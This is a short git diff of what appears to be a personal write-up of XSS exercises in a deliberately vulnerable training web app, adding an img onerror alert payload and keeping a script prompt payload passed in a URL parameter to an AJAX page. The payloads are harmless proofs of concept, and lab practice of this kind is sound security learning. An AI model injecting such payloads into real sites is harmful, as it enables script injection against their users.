@@ -177,8 +177,11 @@ xss_ajax_2-1.php
 
 ### XSS - Reflected (AJAX/XML)
 xss_ajax_1-1.php
+```
+&lt;img src="#" onerror="alert(1)"&gt;
+```
 
-I was not actually able to get it to execute on the page directly, but was able to get XSS to execute on the AJAX called.
+Alternatively I was able to get XSS to execute on the AJAX called.
 ```
 xss_ajax_1-2.php?title=<html xmlns='http://www.w3.org/1999/xhtml'><script>prompt(0)</script></html>
 ```
